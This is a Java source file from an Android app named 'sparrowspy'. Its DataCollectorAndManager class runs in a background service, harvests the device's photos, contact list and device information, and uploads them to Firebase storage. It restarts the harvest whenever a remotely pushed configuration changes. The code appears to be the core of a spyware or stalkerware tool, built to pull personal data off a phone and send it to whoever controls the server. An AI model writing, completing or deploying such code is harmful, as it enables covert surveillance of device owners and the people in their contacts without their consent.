package com.tangledbytes.sparrowspy.services.sparrowservice;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sparrowspy.collectors.ContactsCollector;
import com.tangledbytes.sparrowspy.collectors.DeviceInfoCollector;
import com.tangledbytes.sparrowspy.collectors.ImagesCollector;
import com.tangledbytes.sparrowspy.events.SparrowActions;
import com.tangledbytes.sparrowspy.server.DataUploader;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.FileUtils;
import com.tangledbytes.sparrowspy.utils.SparrowConfiguration;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;

public class DataCollectorAndManager {
    private static final String TAG = "DataCollectorAndManager";
    private final SparrowService sparrowService;
    private final AtomicBoolean collecting = new AtomicBoolean(false);
    private final Handler handler;
    private final DataUploader uploader;
    private final ExecutorService executor;

    public DataCollectorAndManager(SparrowService sparrowService) {
        this.sparrowService = sparrowService;
        this.handler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newCachedThreadPool();
        this.uploader = new DataUploader(sparrowService);
    }

    private void collectData(SparrowConfiguration config) {
        SharedPreferences prefs = sparrowService.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);

        collecting.set(true);
        clearDirectories();
        Log.i(TAG, "Directories cleaned");

        List<Future<?>> tasks = new ArrayList<>();
        tasks.add(submitTask(() -> collectImages(prefs, config)));
        tasks.add(submitTask(() -> collectContacts(prefs, config)));
        tasks.add(submitTask(() -> collectDeviceInfo(prefs, config)));

        // TODO: Can be done by adding UploadTask.onCompleteListeners to each task
        new Thread(() -> {
            waitForTasksCompletion(tasks);
            collecting.set(false);
        }).start();
    }

    private Future<?> submitTask(Runnable task) {
        return executor.submit(() -> {
            try {
                task.run();
            } catch (Exception e) {
                Log.wtf(TAG, "Exception occurred during task execution", e);
            }
        });
    }

    private void collectImages(SharedPreferences prefs, SparrowConfiguration config) {
        if (!config.uploadImages) return; // not requested for upload
        if (prefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)) return; // already uploaded
        new ImagesCollector(config).collect();
        notifyAndUpload(SparrowActions.ACTION_IMAGES_COLLECTED, SparrowActions.ACTION_IMAGES_UPLOADED, uploader.uploadImages());
    }

    private void collectContacts(SharedPreferences prefs, SparrowConfiguration config) {
        if (!config.uploadContacts) return; // not requested for upload
        if (prefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)) return; // already uploaded
        new ContactsCollector(sparrowService).collect();
        notifyAndUpload(SparrowActions.ACTION_CONTACTS_COLLECTED, SparrowActions.ACTION_CONTACTS_UPLOADED, uploader.uploadContacts());
    }

    private void collectDeviceInfo(SharedPreferences prefs, SparrowConfiguration config) {
        if (prefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false)) return; // already uploaded
        new DeviceInfoCollector(sparrowService).collect();
        notifyAndUpload(SparrowActions.ACTION_DEVICE_INFO_COLLECTED, SparrowActions.ACTION_DEVICE_INFO_UPLOADED, uploader.uploadDeviceInfo());
    }

    private void notifyAndUpload(String collectedAction, String uploadedAction, UploadTask task) {
        // Notify about data collection completion
        handler.post(() -> sparrowService.sendBroadcast(new Intent(collectedAction)));
        Log.i(TAG, collectedAction + " completed");

        // Wait for upload to complete
        waitForUpload(task);

        // Notify about upload completion
        handler.post(() -> sparrowService.sendBroadcast(new Intent(uploadedAction)));
        Log.i(TAG, uploadedAction + " completed");
    }

    private void waitForUpload(UploadTask task) {
        if (task != null) {
            while (!task.isComplete()) {
                Utils.sleep(250);
            }
        }
    }

    private void clearDirectories() {
        File[] files = Constants.DIR_APP_ROOT.listFiles();
        if (files != null) {
            for (File file : files) {
                FileUtils.delete(file);
            }
        }
        Constants.init(sparrowService, Constants.DIR_APP_ROOT);
    }

    private void waitForTasksCompletion(List<Future<?>> tasks) {
        for (Future<?> task : tasks) {
            try {
                task.get();
            } catch (Exception e) {
                Log.wtf(TAG, "Exception occurred while waiting for task completion", e);
            }
        }
    }

    public void onConfigChanged(SparrowConfiguration config) {
        new Thread(() -> {
            Log.i(TAG, "onConfigChanged: Waiting for previous data collecting tasks to complete");
            while (collecting.get()) {
                Utils.sleep(250);
            }
            uploader.resetUploadStatuses();
            Log.i(TAG, "onConfigChanged: Starting new data collecting tasks");
            handler.post(() -> collectData(config));
        }).start();
    }
}
